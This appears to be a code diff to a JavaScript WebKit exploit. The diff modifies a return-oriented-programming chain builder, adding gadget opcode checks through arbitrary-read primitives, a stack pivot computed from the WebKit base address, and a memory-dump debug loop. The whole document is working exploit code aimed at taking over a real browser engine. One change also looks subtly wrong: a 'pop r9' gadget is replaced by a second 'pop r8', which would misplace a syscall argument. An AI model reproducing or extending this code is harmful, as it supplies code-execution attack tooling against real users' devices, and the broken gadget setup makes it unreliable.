@@ -37,6 +37,15 @@ function gadget(module, offset, machine) {
             return webkit_base_addr;
         else return 0;
     }
+    
+    if(machine) {
+        this.machine = machine;
+    }
+}
+
+function check(ptr, array)
+{
+  
 }
 
 function RopChain() {
@@ -44,8 +53,19 @@ function RopChain() {
 
     this.add = function(instr) {
         if (typeof(instr) === "string") {
-            this.rop_chain.push(gadgets[instr].addr().getLowBitsUnsigned())
-            this.rop_chain.push(gadgets[instr].addr().getHighBitsUnsigned())
+            var gadget = gadgets[instr];
+            if(gadget.machine) {
+                var tmp = [];
+                var valid = true;
+                for(var i = 0; i < gadget.machine.length; i++){
+                    if((tmp[tmp.length] = read8(gadget.addr().add(i))) != gadget.machine[i]) valid = false;
+                }
+                if(!valid){
+                  throw "Opcode invalid in "+instr+" got "+tmp.reduce(function(p,c){ return p+c.toString(16)+' '},"")
+                }
+            }
+            this.rop_chain.push(gadget.addr().getLowBitsUnsigned())
+            this.rop_chain.push(gadget.addr().getHighBitsUnsigned())
         }
         // If we are only writing a 32bit integer, makes it easier
         else if (typeof(instr) === "number") {
@@ -70,7 +90,7 @@ function RopChain() {
         this.add(typeof(arg4) !== "undefined" ? arg4 : 0)
         this.add("pop r8");
         this.add(typeof(arg5) !== "undefined" ? arg5 : 0)
-        this.add("pop r9");
+        this.add("pop r8");
         this.add(typeof(arg6) !== "undefined" ? arg6 : 0)
         this.add("syscall")
     }
@@ -79,9 +99,11 @@ function RopChain() {
     this.execute = function() {
         debug_log("execute");
         // xchg rax, rsp; dec dword ptr [rax - 0x77]; ret;
-        rop_buf[2] = cbuf[0x10] - ((0x60000 * 4) * 17) + 0xdcac1
-        rop_buf[3] = cbuf[0x11]
+        rop_buf[2] = webkit_base_addr.getLowBitsUnsigned() + 0xd9754; //cbuf[0x10] - ((0x60000 * 4) * 17) + 0xdcac1
+        rop_buf[3] = webkit_base_addr.getHighBitsUnsigned(); //cbuf[0x11]
 
+        for(var i = -256; i < 256; i+=8)
+          debug_log(read64(new dcodeIO.Long(cbuf[0x10] - ((0x60000 * 4) * 4) + 0x168f4 + i, cbuf[0x11], true)).toString(16));
         // pop rcx; pop rcx; ret;
         rop_buf[0] = cbuf[0x10] - ((0x60000 * 4) * 4) + 0x168f4;
         rop_buf[1] = cbuf[0x11]
